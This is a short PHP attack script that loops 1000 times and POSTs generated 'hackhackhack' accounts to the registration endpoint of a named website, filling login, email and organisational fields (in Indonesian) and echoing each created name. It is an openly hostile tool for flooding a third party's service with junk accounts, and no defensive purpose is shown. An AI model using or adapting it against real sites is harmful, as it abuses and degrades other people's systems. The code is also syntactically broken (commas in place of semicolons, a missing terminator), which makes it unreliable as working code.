<?php
// set post fields
$kata = "hackhackhackhack";

for ($i=1; $i <= 1000 ; $i++) {
	$kata_tmp = $kata . $i; 
	$post['username'] = $kata_tmp,
	$post['password'] = $kata_tmp,
	$post['email'] = $kata_tmp,
	$post['nama'] = $kata_tmp,
	$post['pembimbing'] = $kata_tmp,
	$post['ketua'] = $kata_tmp,
	$post['sekertaris'] = $kata_tmp,
	$post['bendahara'] = $kata_tmp

	$ch = curl_init('http://appk.traoz.xyz/Login/register');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

	curl_exec($ch);

	curl_close($ch);

	?>
	<p>Created: <?php echo $kata_tmp; ?></p>
	<?php
}

?>